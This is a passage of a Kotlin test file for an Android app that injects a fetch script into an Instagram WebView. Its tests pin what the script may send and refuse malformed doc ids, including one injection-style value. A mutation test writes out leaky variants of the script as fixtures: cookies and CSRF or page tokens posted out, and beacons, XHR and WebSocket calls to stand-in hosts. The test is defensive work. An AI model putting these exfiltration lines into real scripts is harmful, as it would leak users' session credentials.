        val pages = Pages()
        val transport = transport(pages)

        // A GET in flight: the GraphQL call is refused, and sends nothing.
        val get = call(transport, "api/v1/feed/saved/posts/")
        runCurrent()
        val page = pages.created.single()
        assertIs<InstagramException.Transient>(graphQlCall(transport).await().exceptionOrNull())
        assertEquals(listOf(SCRIPT, fetchOf(1, "\"api/v1/feed/saved/posts/\"")), page.evaluated)
        page.post(reply(1))
        get.await().getOrThrow()

        // And the other way round: a GraphQL call in flight refuses a GET.
        val graphQl = graphQlCall(transport)
        runCurrent()
        assertIs<InstagramException.Transient>(call(transport, "api/v1/feed/saved/posts/").await().exceptionOrNull())
        assertEquals(graphQlOf(2), page.evaluated.last())
        page.post(reply(2))
        graphQl.await().getOrThrow()

        // Where the page is now is checked before the GraphQL call too: moved to a challenge, nothing is evaluated.
        page.url = "https://www.instagram.com/challenge/?next=%2F"
        assertIs<InstagramException.ChallengeRequired>(graphQlCall(transport).await().exceptionOrNull())
        assertEquals(4, page.evaluated.size)
        assertTrue(page.destroyed)

        // A page that lands on the login makes no GraphQL call, and the verdict sticks for GETs and GraphQL calls alike.
        val loginPages = Pages(FakeWebPage(landing = "https://www.instagram.com/accounts/login/?next=%2F"))
        val loginTransport = transport(loginPages)
        assertIs<InstagramException.LoginRequired>(graphQlCall(loginTransport).await().exceptionOrNull())
        assertIs<InstagramException.LoginRequired>(call(loginTransport, "api/v1/feed/saved/posts/").await().exceptionOrNull())
        assertIs<InstagramException.LoginRequired>(graphQlCall(loginTransport).await().exceptionOrNull())
        assertEquals(1, loginPages.attempts)
        assertEquals(emptyList(), loginPages.created.single().evaluated)
    }

    /**
     * R20: a page without tokens sent no query (-2). That is `QueryNotSent`, not `Transient`, so it is never retried (the names
     * fall back at once), and the page is KEPT: a GET needs no tokens, and dropping it would only cost a home-page load.
     */
    @Test
    fun aPageWithoutTokensIsQueryNotSentAndKept() = runTest {
        val pages = Pages()
        val transport = transport(pages)
        val pending = graphQlCall(transport)
        runCurrent()
        val page = pages.created.single()
        page.post("""{"id":1,"code":-2,"contentType":null,"body":null,"redirected":false}""")

        val notSent = assertIs<InstagramException.QueryNotSent>(pending.await().exceptionOrNull())
        assertEquals("query not sent: no tokens", notSent.message)
        assertFalse(page.destroyed)
        assertEquals(1, pendingIdleTimers(), "a kept page has its idle timer")

        // The same page serves the next call, a GET or a GraphQL one.
        val get = call(transport, "api/v1/feed/saved/posts/")
        runCurrent()
        page.post(reply(2))
        assertEquals(200, get.await().getOrThrow().code)
        val next = graphQlCall(transport)
        runCurrent()
        assertEquals(1, pages.created.size)
        assertEquals(graphQlOf(3), page.evaluated.last())
        page.post(reply(3))
        assertEquals(200, next.await().getOrThrow().code)
    }

    /** -2 means "no tokens" only for a GraphQL call; a GET's script never posts it, so for one it is just no status at all. */
    @Test
    fun aNoTokensCodeOnAGetIsANetworkError() = runTest {
        val pages = Pages()
        val transport = transport(pages)
        val pending = call(transport, "api/v1/feed/saved/posts/")
        runCurrent()
        pages.created.single().post("""{"id":1,"code":-2,"contentType":null,"body":null,"redirected":false}""")

        assertIs<InstagramException.Transient>(pending.await().exceptionOrNull())
        assertFalse(pages.created.single().destroyed)
    }

    /** The page's own allow-list refused the name (-3): the Kotlin and script lists disagree. Transient; the page is fine. */
    @Test
    fun aQueryThePageRefusesIsTransientAndThePageIsKept() = runTest {
        val pages = Pages()
        val transport = transport(pages)
        val pending = graphQlCall(transport)
        runCurrent()
        val page = pages.created.single()
        page.post("""{"id":1,"code":-3,"contentType":null,"body":null,"redirected":false}""")

        assertIs<InstagramException.Transient>(pending.await().exceptionOrNull())
        assertFalse(page.destroyed)
        val next = graphQlCall(transport)
        runCurrent()
        page.post(reply(2))
        assertEquals(200, next.await().getOrThrow().code)
        assertEquals(1, pages.created.size)
    }

    @Test
    fun graphqlIsLogged() = runTest {
        val lines = mutableListOf<String>()
        val pages = Pages()
        val transport = transport(pages, log = lines::add)
        val docId = "27584326974521636"
        val variables = WebGraphQl.savedCollectionsVariables("QVFE_cursor_9")

        val ok = async { runCatching { transport.graphql(WebGraphQl.SAVED_COLLECTIONS, docId, variables) } }
        runCurrent()
        advanceTimeBy(75)
        pages.created.single().post(reply(1, body = """{"data":{"viewer":{"collections_unified_with_auto_collections":{}}}}"""))
        ok.await().getOrThrow()

        val errorBody = """{"errors":[{"message":"a private message","code":1675002}],"status":"fail"}"""
        val failing = async { runCatching { transport.graphql(WebGraphQl.SAVED_COLLECTIONS, docId, variables) } }
        runCurrent()
        advanceTimeBy(20)
        pages.created.single().post(reply(2, code = 400, body = errorBody))
        failing.await().getOrThrow()

        val noTokens = async { runCatching { transport.graphql(WebGraphQl.SAVED_COLLECTIONS, docId, variables) } }
        runCurrent()
        pages.created.single().post("""{"id":3,"code":-2,"contentType":null,"body":null,"redirected":false}""")
        assertIs<InstagramException.QueryNotSent>(noTokens.await().exceptionOrNull())

        assertEquals(
            listOf(
                "GRAPHQL PolarisProfileSavedTabContentQuery -> 200 (75 ms)",
                "GRAPHQL PolarisProfileSavedTabContentQuery -> 400 (20 ms)",
                ErrorReplySummary.of(400, "application/json", errorBody),
                "GRAPHQL PolarisProfileSavedTabContentQuery -> no tokens (0 ms)",
            ),
            lines,
        )
        // Never the doc id, never the variables, never the body of a 2xx.
        assertFalse(lines.any { docId in it || "QVFE_cursor_9" in it || "collection_types" in it || "first" in it || "viewer" in it }, "$lines")
    }

    @Test
    fun aGraphQlQueryOutsideTheAllowListIsRefused() = runTest {
        val pages = Pages()
        val transport = transport(pages)
        // Only `:instagram` can make a query; a test can only reach the constructor by reflection.
        val other = GraphQlQuery::class.java.getDeclaredConstructor(String::class.java, String::class.java)
            .apply { isAccessible = true }
            .newInstance("PolarisSomeOtherQuery", "1")

        assertFailsWith<IllegalArgumentException> { transport.graphql(other, "1", "{}") }
        assertEquals(0, pages.attempts)

        // Nothing was left behind: an allowed query goes through.
        val next = graphQlCall(transport)
        runCurrent()
        assertEquals(listOf(SCRIPT, graphQlOf(1)), pages.created.single().evaluated)
        pages.created.single().post(reply(1))
        assertEquals(200, next.await().getOrThrow().code)
    }

    /**
     * The allow-list names the query, but the server runs whatever persisted query the doc id names: so a doc id is what the
     * website sends, ASCII digits only and at most [WebGraphQl.DOC_ID_MAX_DIGITS] of them, or nothing is sent at all.
     */
    @Test
    fun aDocIdThatIsNotDigitsIsRefused() = runTest {
        val pages = Pages()
        val transport = transport(pages)
        val refused = listOf(
            "", "12a", "0x1F", "-1", "1.5", " 123", "123 ", "123\n", "1\");x(\"", "١٢٣", "1".repeat(WebGraphQl.DOC_ID_MAX_DIGITS + 1),
        )
        for (docId in refused) {
            assertFailsWith<IllegalArgumentException>(docId) { transport.graphql(WebGraphQl.SAVED_COLLECTIONS, docId, "{}") }
        }
        assertEquals(0, pages.attempts)

        // The longest allowed one goes through.
        val longest = "9".repeat(WebGraphQl.DOC_ID_MAX_DIGITS)
        val next = graphQlCall(transport, docId = longest)
        runCurrent()
        assertTrue("\"$longest\"" in pages.created.single().evaluated.last())
        pages.created.single().post(reply(1))
        assertEquals(200, next.await().getOrThrow().code)
    }

    /** R105 holds for a GraphQL call: the caller gives up, the page's fetch for it is aborted, the next call goes through. */
    @Test
    fun aCancelledGraphQlCallAbortsItsFetch() = runTest {
        val pages = Pages()
        val transport = transport(pages)
        val abandoned = launch { transport.graphql(WebGraphQl.SAVED_COLLECTIONS, "123", """{"first":12}""") }
        runCurrent()
        val page = pages.created.single()
        abandoned.cancel()
        runCurrent()

        val next = graphQlCall(transport)
        runCurrent()
        assertEquals(listOf(SCRIPT, graphQlOf(1), abortOf(1), SCRIPT, graphQlOf(2)), page.evaluated)
        page.post(reply(1, body = "late"))
        runCurrent()
        assertTrue(next.isActive)
        page.post(reply(2, body = "answer"))
        assertEquals("answer", next.await().getOrThrow().body)
    }

    private fun script(): String =
        File("src/main/assets/ig_fetch.js").also { assertTrue(it.isFile, "unit tests must run from the app module directory") }.readText()

    @Test
    fun theScriptsHeadersMatchTheConstants() {
        assertScriptSendsOnlyWhatItShould(script())
    }

    /** The pin itself: each way of making the script send or post what it must not fails it, so a pass above means something. */
    @Test
    fun eachWayOfLeakingOrWideningTheScriptFailsThePin() {
        val real = script()
        val mutants = mapOf(
            "S1: a reply body that is the cookie jar" to real.replaceFirst("body: null, redirected: false", "body: document.cookie, redirected: false"),
            "S1: a body that is the CSRF token" to real.replaceFirst("body: t,", "body: cookie('csrftoken'),"),
            "S1: a content type that is the claim" to real.replaceFirst("contentType: ct, body: t", "contentType: claim(), body: t"),
            "S1: a second body field" to real.replaceFirst("body: t, redirected: false", "body: t, body: document.title, redirected: false"),
            "S1: sessionStorage read outside the claim helper" to real.replaceFirst("body: null, redirected: true", "body: sessionStorage.getItem('x'), redirected: true"),
            "a second redirect option that follows" to real.replace("redirect: 'manual',", "redirect: 'manual', redirect: 'follow',"),
            "a redirect that is followed" to real.replace("redirect: 'manual'", "redirect: 'follow'"),
            "credentials sent cross-site" to real.replace("credentials: 'same-origin'", "credentials: 'include'"),
            "another method" to real.replace("method: 'GET'", "method: 'POST'"),
            "an extra fetch option" to real.replace("method: 'GET',", "method: 'GET', mode: 'no-cors',"),
            "no CSRF header" to real.replace("      'x-csrftoken': cookie('csrftoken'),\n", ""),
            "no claim header" to real.replace(",\n      'x-ig-www-claim': claim()", ""),
            "J03: another claim key" to real.replace("'www-claim-v2'", "'www-claim'"),
            "J04: a path relative to the page" to real.replace("fetch('/' + path,", "fetch(path,"),
            "J05: a network failure posted for another id" to real.replace("id: id, code: -1", "id: 0, code: -1"),
            "another app id" to real.replace(WebHeaders.APP_ID, "936619743392459"),
            "one more post" to real.replace("      .then(forget, forget);", "      .then(forget, forget);\n    window.igBridge.postMessage(document.cookie);"),
            // GraphQL: the page's tokens stay in the page, the allow-list holds, and the POST is the website's own.
            "S1: a body that is the page's token (as the brief named it)" to inGraphQl(real) { it.replace("code: -1, contentType: null, body: null", "code: -1, contentType: null, body: t.dtsg") },
            "S1: a body that is the page's token" to inGraphQl(real) { it.replace("code: -1, contentType: null, body: null", "code: -1, contentType: null, body: tok.dtsg") },
            "S1: the page's tokens posted whole" to inGraphQl(real) { it.replace("code: -1, contentType: null, body: null", "code: -1, contentType: null, body: JSON.stringify(tok)") },
            "S1: the page's HTML posted" to real.replace("code: -3, contentType: null, body: null", "code: -3, contentType: null, body: document.documentElement.innerHTML"),
            "S1: the reply text posted where there is none" to real.replace("code: -2, contentType: null, body: null", "code: -2, contentType: null, body: t"),
            "S1: a GraphQL reply handled apart from answer()" to inGraphQl(real) {
                it.replace(".then(answer(id))", ".then(function (r) { window.igBridge.postMessage(JSON.stringify({ id: id, code: r.status, contentType: null, body: null, redirected: false })); })")
            },
            "a token kept outside the form and the headers" to real.replace("var tok = tokens();", "var tok = tokens(); window.__kept = tok.lsd;"),
            "the tokens kept whole" to real.replace("var tok = tokens();", "var tok = tokens(); window.__kept = tok;"),
            "the token reader kept for later" to real.replace("var tok = tokens();", "var tok = tokens(); window.__read = tokens;"),
            "a token in the GraphQL URL" to real.replace("fetch('/api/graphql', {", "fetch('/api/graphql?q=' + tok.lsd, {"),
            // The review's probes (R1 of fix round 1): every other way out of the page, and logcat (WebView logs `console` there).
            "probe: the tokens logged" to real.replace("var tok = tokens();", "var tok = tokens(); console.log(JSON.stringify(tok));"),
            "probe: the tokens logged inside tokens()" to real.replace("    return dtsg && lsd ?", "    console.log(dtsg + ' ' + lsd);\n    return dtsg && lsd ?"),
            "probe: a beacon to another site from tokens()" to real.replace("    return dtsg && lsd ?", "    navigator.sendBeacon('https://example.invalid/', dtsg + lsd);\n    return dtsg && lsd ?"),
            "probe: a beacon with the tokens" to real.replace("var tok = tokens();", "var tok = tokens(); navigator.sendBeacon('/x', JSON.stringify(tok));"),
            "probe: the tokens posted through a computed member" to real.replace("var tok = tokens();", "var tok = tokens(); window.igBridge['postMessage'](JSON.stringify(tok));"),
            "probe: the bridge kept under another name" to real.replace("var tok = tokens();", "var tok = tokens(); var b = window.igBridge;"),
            "probe: an image request with a token" to real.replace("var tok = tokens();", "var tok = tokens(); new Image().src = '/x?' + tok.lsd;"),
            "probe: an XMLHttpRequest with the tokens" to real.replace("var tok = tokens();", "var tok = tokens(); var x = new XMLHttpRequest(); x.open('POST', '/x'); x.send(JSON.stringify(tok));"),
            "probe: a WebSocket with the tokens" to real.replace("var tok = tokens();", "var tok = tokens(); new WebSocket('wss://example.invalid/').onopen = function () {};"),
            "probe: an event source" to real.replace("var tok = tokens();", "var tok = tokens(); new EventSource('/x');"),
            "probe: a third fetch with the tokens" to real.replace("var tok = tokens();", "var tok = tokens(); fetch('/x', { method: 'POST', body: JSON.stringify(tok) });"),
            "probe: the tokens stored" to real.replace("var tok = tokens();", "var tok = tokens(); localStorage.setItem('x', tok.lsd);"),
            "probe: a token written into the page by tokens()" to real.replace("    return dtsg && lsd ?", "    document.title = dtsg;\n    return dtsg && lsd ?"),
            "probe: tokens() reads one from elsewhere" to real.replace("      lsd = lsd || (l && l[1]);", "      lsd = lsd || (l && l[1]) || cookie('lsd');"),
            "probe: a GET logged" to real.replace("    var controller = new AbortController();", "    console.log(path);\n    var controller = new AbortController();"),
            "a second query in the script's list" to real.replace("var QUERIES = ['PolarisProfileSavedTabContentQuery'];", "var QUERIES = ['PolarisProfileSavedTabContentQuery', 'PolarisOtherQuery'];"),
            "another query in the script's list" to real.replace("var QUERIES = ['PolarisProfileSavedTabContentQuery'];", "var QUERIES = ['PolarisOtherQuery'];"),
            "no allow-list check" to real.replace("QUERIES.indexOf(name) < 0 || ", ""),
            "an allow-list check that lets everything through" to real.replace("QUERIES.indexOf(name) < 0 ||", "QUERIES.indexOf(name) < -1 ||"),
            // Minor 1 of fix round 1: the doc id is what the website sends, or nothing is sent.
            "no doc id check" to real.replace(""" || !/^\d{1,30}$/.test(docId)""", ""),
            "a longer doc id allowed" to real.replace("""/^\d{1,30}$/""", """/^\d{1,300}$/"""),
            "any doc id allowed" to real.replace("""/^\d{1,30}$/""", """/^.{1,30}$/"""),
            "a refused name that still sends" to inGraphQl(real) { it.replaceFirst("      return;\n", "") },
            "a page without tokens that still sends" to inGraphQl(real) { it.substringBeforeLast("      return;\n") + it.substringAfterLast("      return;\n") },
            "the no-tokens and refused codes swapped" to real.replace("code: -3,", "code: -9,").replace("code: -2,", "code: -3,").replace("code: -9,", "code: -2,"),
            "a GraphQL POST that follows redirects" to inGraphQl(real) { it.replace("redirect: 'manual'", "redirect: 'follow'") },
            "a GraphQL POST with credentials cross-site" to inGraphQl(real) { it.replace("credentials: 'same-origin'", "credentials: 'include'") },
            "a GraphQL call as a GET" to inGraphQl(real) { it.replace("method: 'POST'", "method: 'GET'") },
            "another GraphQL path" to real.replace("fetch('/api/graphql', {", "fetch('/api/graphql/query', {"),
            "an extra form field" to real.replace("doc_id: docId });", "doc_id: docId, av: document.title });"),
            "the doc id from somewhere else" to real.replace("doc_id: docId });", "doc_id: '1' });"),
            "the form in another order" to real.replace("{ fb_dtsg: tok.dtsg, lsd: tok.lsd,", "{ lsd: tok.lsd, fb_dtsg: tok.dtsg,"),
            "another caller class" to real.replace("fb_api_caller_class: 'RelayModern'", "fb_api_caller_class: 'Relay'"),
            "an extra GraphQL header" to real.replace("'x-csrftoken': cookie('csrftoken') };", "'x-csrftoken': cookie('csrftoken'), 'x-ig-www-claim': claim() };"),
            "no friendly-name header" to real.replace("'x-fb-friendly-name': name, ", ""),
            "another app id on the GraphQL POST" to inGraphQl(real) { it.replace(WebHeaders.APP_ID, "936619743392459") },
        )
        for ((what, mutant) in mutants) {
            assertTrue(mutant != real, "the mutant '$what' did not change the script")
            assertFailsWith<AssertionError>(what) { assertScriptSendsOnlyWhatItShould(mutant) }
        }
    }

    /** [real] with [change] applied to the body of `window.__igGraphQl` only. */
    private fun inGraphQl(real: String, change: (String) -> String): String {
        val graphQl = block(real, GRAPHQL_OPENING)
        return real.replace(graphQl, change(graphQl))
    }

    /**
     * What `ig_fetch.js` may send and post. The header constants are `WebHeaders`' own; the CSRF token and the claim go into the
     * request's headers and nowhere else; a GET is one same-origin GET to `/` + the path that follows no redirect; and every
     * message to Kotlin is `{id, code, contentType, body, redirected}` with the call's own id, the status, the reply's content
     * type and text (or null) and nothing else, so no cookie, token or claim can ever reach the app or its log.
     *
     * GraphQL: one same-origin POST to `/` + `WebGraphQl.PATH` that follows no redirect, with exactly the website's form and
     * headers (`WebGraphQl.FORM_FIELDS` and `WebGraphQl.HEADERS`, in their order). Before anything else it checks that the name
     * is in the script's own list, which is `WebGraphQl.ALL`'s, and that the doc id is digits only. The page's `fb_dtsg` and
     * `lsd` are read by `tokens()`, which is pinned to its exact text, are named only there, in the form and in the headers, and
     * the object holding them (`tok`) is only made, checked and read for the form and the headers; so they can reach the
     * request and nothing else. No other way out of the page exists ([BANNED_IN_SCRIPT]: no `console`, no beacon, no other
     * request API), the bridge and `postMessage` are named only in the seven posts, the messages the GraphQL call posts itself
     * carry no content type and no body, and its reply goes through the same `answer(id)` as a GET's, so the posted shape
     * cannot drift.
     */
    private fun assertScriptSendsOnlyWhatItShould(script: String) {
        val get = block(script, "window.__igFetch = function (id, path) {")
        val graphQl = block(script, GRAPHQL_OPENING)
        val answer = block(script, "function answer(id) {")

        val headers = block(get, "var headers = {")
        assertTrue("'x-ig-app-id': '${WebHeaders.APP_ID}'" in headers, "x-ig-app-id: $headers")
        assertTrue("'x-asbd-id': '${WebHeaders.ASBD_ID}'" in headers, "x-asbd-id: $headers")
        assertTrue("'x-requested-with': 'XMLHttpRequest'" in headers, "x-requested-with: $headers")
        assertTrue("'x-csrftoken': cookie('csrftoken')" in headers, "x-csrftoken: $headers")
        assertTrue("'x-ig-www-claim': claim()" in headers, "x-ig-www-claim: $headers")

        // The GraphQL headers and form: exactly `:instagram`'s names (R6), in its order, each with its one value.
        val graphQlHeaders = block(graphQl, "var headers = {")
        val headerValues = mapOf(
            WebGraphQl.Header.CONTENT_TYPE to "'application/x-www-form-urlencoded'",
            WebGraphQl.Header.FRIENDLY_NAME to "name",
            WebGraphQl.Header.LSD to "tok.lsd",
            WebGraphQl.Header.APP_ID to "'${WebHeaders.APP_ID}'",
            WebGraphQl.Header.ASBD_ID to "'${WebHeaders.ASBD_ID}'",
            WebGraphQl.Header.CSRF_TOKEN to "cookie('csrftoken')",
        )
        assertEquals(WebGraphQl.HEADERS.toSet(), headerValues.keys, "this test knows the value of every header in WebGraphQl.HEADERS")
        val sentHeaders = fieldsOf(graphQlHeaders).map { (name, value) -> name.removeSurrounding("'") to value }
        assertEquals(WebGraphQl.HEADERS, sentHeaders.map { it.first }, "the GraphQL headers are WebGraphQl.HEADERS, in its order")
        assertEquals(headerValues, sentHeaders.toMap(), "the GraphQL header values")

        val form = block(graphQl, "var body = new URLSearchParams({")
        val formValues = mapOf(
            WebGraphQl.Field.DTSG to "tok.dtsg",
            WebGraphQl.Field.LSD to "tok.lsd",
            WebGraphQl.Field.CALLER_CLASS to "'${WebGraphQl.CALLER_CLASS}'",
            WebGraphQl.Field.FRIENDLY_NAME to "name",
            WebGraphQl.Field.VARIABLES to "variables",
            WebGraphQl.Field.SERVER_TIMESTAMPS to "'true'",
            WebGraphQl.Field.DOC_ID to "docId",
        )
        assertEquals(WebGraphQl.FORM_FIELDS.toSet(), formValues.keys, "this test knows the value of every field in WebGraphQl.FORM_FIELDS")
        val sentForm = fieldsOf(form)
        assertEquals(WebGraphQl.FORM_FIELDS, sentForm.map { it.first }, "the GraphQL form is WebGraphQl.FORM_FIELDS, in its order")
        assertEquals(formValues, sentForm.toMap(), "the GraphQL form values")

        // The jar and the session storage are read only by the two helpers, and the helpers are called only for the headers.
        val cookieHelper = block(script, "function cookie(name) {")
        val claimHelper = block(script, "function claim() {")
        assertTrue("sessionStorage.getItem('www-claim-v2')" in claimHelper, "the site's own claim key: $claimHelper")
        val outsideHelpers = script.replace(cookieHelper, "").replace(claimHelper, "")
        assertFalse("document.cookie" in outsideHelpers, "document.cookie is read only by cookie()")
        assertFalse("sessionStorage" in outsideHelpers, "sessionStorage is read only by claim()")
        val outsideHeaders = outsideHelpers.replace(headers, "").replace(graphQlHeaders, "")
        assertFalse(Regex("""(?<!function )\bcookie\(""").containsMatchIn(outsideHeaders), "cookie() is called only for the headers")
        assertFalse(Regex("""(?<!function )\bclaim\(""").containsMatchIn(outsideHeaders), "claim() is called only for the headers")

        // No way out of the page but the two fetches and the bridge, and nothing written to logcat (a WebView without a
        // WebChromeClient logs `console` there, release builds too). Whole words of the code; the one exemption is the value of
        // the GET's `x-requested-with` header, which is the site's own and pinned above.
        val reachable = withoutComments(script).replace("'x-requested-with': 'XMLHttpRequest'", "")
        for (banned in BANNED_IN_SCRIPT) {
            assertFalse(Regex("""\b${Regex.escape(banned)}\b""").containsMatchIn(reachable), "the script never uses `$banned`")
        }

        // The page's tokens: read by tokens() alone, which is exactly the text below (it reads them and returns them, nothing
        // else), called once by the GraphQL call into `tok`, which is checked and then used only in the form and the headers.
        val tokensHelper = block(script, "function tokens() {")
        assertEquals(codeOf(TOKENS_BODY), codeOf(tokensHelper), "tokens() is exactly the reader the tests know")
        val outsideTokenUse = script.replace(tokensHelper, "").replace(form, "").replace(graphQlHeaders, "")
        assertFalse(Regex("(?i)dtsg|lsd").containsMatchIn(outsideTokenUse), "the tokens are named only in tokens(), the form and the headers")
        assertFalse("innerHTML" in script.replace(tokensHelper, ""), "the page's HTML is read only by tokens()")
        val code = withoutComments(script)
        assertEquals(1, Regex("""(?<!function )\btokens\(""").findAll(code).count(), "tokens() is called once")
        assertEquals(2, Regex("""\btokens\b""").findAll(code).count(), "tokens is defined and called, never passed around")
        assertTrue("var tok = tokens();" in graphQl, "by the GraphQL call")
        val graphQlRest = withoutComments(graphQl.replace(form, "").replace(graphQlHeaders, ""))
        // Each of the two statements once, and no other `tok`: it is only made and checked there.
        for (statement in listOf("var tok = tokens();", "if (!tok) {")) {
            assertEquals(1, graphQlRest.split(statement).size - 1, "`$statement` once in the GraphQL call")
        }
        assertEquals(2, Regex("""\btok\b""").findAll(graphQlRest).count(), "outside the form and the headers, tok is only made and checked")
        assertFalse(Regex("""\btok\b""").containsMatchIn(withoutComments(script.replace(graphQl, ""))), "tok exists only in the GraphQL call")
        // So `t` means one thing: the reply's text, inside answer().
        assertFalse(Regex("""\bt\b""").containsMatchIn(withoutComments(script.replace(answer, ""))), "t is answer()'s reply text alone")

        // The allow-list: the script's own list is `:instagram`'s, and the call first checks the name and that the doc id is what
        // the website sends (digits only); a refused call, or a page without tokens, ends before its request.
        val lists = Regex("""var QUERIES = \[([^\]]*)];""").findAll(script).toList()
        assertEquals(1, lists.size, "one list of queries")
        assertEquals(
            WebGraphQl.ALL.map { it.friendlyName },
            lists.single().groupValues[1].split(',').map { it.trim().removeSurrounding("'") },
            "the script's queries are WebGraphQl.ALL's",
        )
        assertEquals(2, Regex("""\bQUERIES\b""").findAll(code).count(), "the list is declared and checked, nothing else")
        val check = """if (QUERIES.indexOf(name) < 0 || !/^\d{1,${WebGraphQl.DOC_ID_MAX_DIGITS}}$/.test(docId)) {"""
        assertTrue(graphQl.trimStart().startsWith(check), "the name and the doc id are checked first: $graphQl")
        val refused = block(graphQl, check)
        val noTokens = block(graphQl, "if (!tok) {")
        assertTrue(refused.trimEnd().endsWith("return;"), "a refused call ends there: $refused")
        assertTrue(noTokens.trimEnd().endsWith("return;"), "a page without tokens ends the call: $noTokens")
        assertEquals("-3", postsOf(refused).single().toMap()["code"], "a refused call is code -3")
        assertEquals("-2", postsOf(noTokens).single().toMap()["code"], "a page without tokens is code -2")
        val order = listOf(check, "var tok = tokens();", "if (!tok) {", "fetch(").map { graphQl.indexOf(it) }
        assertEquals(order.sorted(), order, "check the call, read the tokens, check them, then fetch: $order")

        // One same-origin GET to the path and one same-origin POST to the GraphQL path, no redirect followed: each option once,
        // and no other.
        assertEquals(2, Regex("""\bfetch\(""").findAll(script).count(), "two fetches: the GET and the GraphQL POST")
        assertEquals(
            listOf("method" to "'GET'", "credentials" to "'same-origin'", "redirect" to "'manual'", "headers" to "headers", "signal" to "controller.signal")
                .sortedBy { it.first },
            fieldsOf(block(get, "fetch('/' + path, {")).sortedBy { it.first },
            "the GET's fetch options",
        )
        assertEquals(
            listOf(
                "method" to "'POST'",
                "credentials" to "'same-origin'",
                "redirect" to "'manual'",
                "headers" to "headers",
                "body" to "body",
                "signal" to "controller.signal",
            ).sortedBy { it.first },
            fieldsOf(block(graphQl, "fetch('/${WebGraphQl.PATH}', {")).sortedBy { it.first },
            "the GraphQL fetch options",
        )

        // Nothing but the reply goes to Kotlin.
        val posts = postsOf(script)
        assertEquals(7, posts.size, "the script posts a message in seven places")
        assertEquals(7, Regex("""postMessage\(""").findAll(script).count(), "every postMessage is one of those")
        assertEquals(7, Regex("""\bpostMessage\b""").findAll(script).count(), "postMessage is named nowhere else (no computed member)")
        assertEquals(7, Regex("""\bigBridge\b""").findAll(script).count(), "nor is the bridge (never kept under another name)")
        for (fields in posts) {
            val keys = fields.map { it.first }
            assertEquals(keys.distinct(), keys, "each field once: $fields")
            val post = fields.toMap()
            assertEquals(setOf("id", "code", "contentType", "body", "redirected"), post.keys, "$post")
            assertEquals("id", post["id"], "a message carries its call's own id: $post")
            assertTrue(post["code"] in setOf("r.status", "0", "-1", "-2", "-3"), "$post")
            assertTrue(post["contentType"] in setOf("ct", "null"), "the content type is the reply's or none: $post")
            assertTrue(post["body"] in setOf("t", "null"), "the body is the reply's text or none: $post")
            assertTrue(post["redirected"] in setOf("true", "false"), "$post")
        }
        // A reply is posted by answer() alone (for both kinds of call); every other message is a code with nothing in it.
        assertEquals(3, postsOf(answer).size, "answer() posts a redirect, a reply's text, or its status alone")
        for (post in postsOf(script.replace(answer, "")).map { it.toMap() }) {
            assertTrue(post["code"] in setOf("-1", "-2", "-3"), "outside answer() a message is a failure code: $post")
            assertEquals("null", post["contentType"], "with no content type: $post")
            assertEquals("null", post["body"], "and no body: $post")
            assertEquals("false", post["redirected"], "$post")
        }
        assertEquals(1, Regex("""\.then\(answer\(id\)\)""").findAll(get).count(), "the GET's reply goes through answer()")
        assertEquals(1, Regex("""\.then\(answer\(id\)\)""").findAll(graphQl).count(), "the GraphQL reply goes through answer()")
        assertTrue("var ct = r.headers.get('content-type');" in answer, "ct is the reply's content type")
        assertTrue("function (t) {" in answer && "r.text().then(" in answer, "t is the reply's text")
    }

    /** [script] without its whole-line `//` comments (the script has no other kind), so words in a comment are not code. */
    private fun withoutComments(script: String): String = script.lines().filterNot { it.trimStart().startsWith("//") }.joinToString("\n")

    /** [script]'s code as one line: no whole-line comments, every run of white space one space. */
    private fun codeOf(script: String): String = withoutComments(script).replace(Regex("""\s+"""), " ").trim()

    /** The fields of every `igBridge.postMessage(JSON.stringify({...}))` in [script], in order. */
    private fun postsOf(script: String): List<List<Pair<String, String>>> =
        Regex("""igBridge\.postMessage\(JSON\.stringify\(\{(.*?)\}\)\)""").findAll(script).map { fieldsOf(it.groupValues[1]) }.toList()

    /** The text between the `{` that ends [opening] and its matching `}` (quoted strings skipped). */
    private fun block(script: String, opening: String): String {
        val start = script.indexOf(opening)
        assertTrue(start >= 0, "the script has no `$opening`")
        var depth = 0
        var quote: Char? = null
        var k = start + opening.length - 1
        while (k < script.length) {
            val c = script[k]
            when {
                quote != null -> if (c == '\\') k++ else if (c == quote) quote = null
                c == '\'' || c == '"' -> quote = c
                c == '{' -> depth++
                c == '}' -> if (--depth == 0) return script.substring(start + opening.length, k)
            }
            k++
        }
        error("unbalanced `$opening` in the script")
    }

    /** `key: value` pairs of a flat object literal, in order (a key that appears twice appears twice). */
    private fun fieldsOf(literal: String): List<Pair<String, String>> =
        literal.split(',').map { it.trim() }.filter { it.isNotEmpty() }.map { field ->
            val colon = field.indexOf(':')
            assertTrue(colon > 0, "not a key: value field: $field")
            field.substring(0, colon).trim() to field.substring(colon + 1).trim()
        }

    /**
     * R105: every call's fetch has its own AbortController, kept by id, and `window.__igAbort(id)` aborts it; both are defined in
     * the same guarded block as `__igFetch`, so a second injection keeps the controllers of the calls in flight. (The emulator
     * test shows the abort on the wire.)
     */
    @Test
    fun theScriptCanAbortACallById() {
        val script = File("src/main/assets/ig_fetch.js").also { assertTrue(it.isFile, "unit tests must run from the app module directory") }.readText()
        // Both kinds of call: the GET and the GraphQL POST.
        for (call in listOf(block(script, "window.__igFetch = function (id, path) {"), block(script, GRAPHQL_OPENING))) {
            assertTrue(Regex("""signal:\s*controller\.signal""").containsMatchIn(call), "the fetch takes the call's signal: $call")
            assertTrue(Regex("""aborts\[id]\s*=\s*controller""").containsMatchIn(call), "the controller is kept by id: $call")
        }
        assertTrue("window.__igAbort = function (id)" in script, "the abort is exposed")
        val guard = script.indexOf("if (window.__igFetch) return;")
        assertTrue(guard in 0 until script.indexOf("window.__igAbort = function"), "defined once, behind the same guard")
        assertTrue(guard in 0 until script.indexOf(GRAPHQL_OPENING), "the GraphQL call too")
    }

    @Test
    fun theDebugLogShowsPathStatusAndTimeButNoBody() = runTest {
        val lines = mutableListOf<String>()
        val pages = Pages()
        val transport = transport(pages, log = lines::add)
        val pending = call(transport, "api/v1/feed/collection/17900000000000002/posts/?max_id=QVFE_cursor_9&n=12")
        runCurrent()
        advanceTimeBy(120)
        pages.created.single().post(
            reply(1, body = """{"items":[{"pk":"3100000000000000001","caption":{"text":"a private caption"}}],"status":"ok"}"""),
        )
        pending.await().getOrThrow()

        // Digit runs of three or more are hidden; shorter ones stay. Nothing of the body, and no summary for a 2xx.
        assertEquals(listOf("GET api/v1/feed/collection/<n>/posts/?max_id=QVFE_cursor_9&n=12 -> 200 (120 ms)"), lines)
    }

    @Test
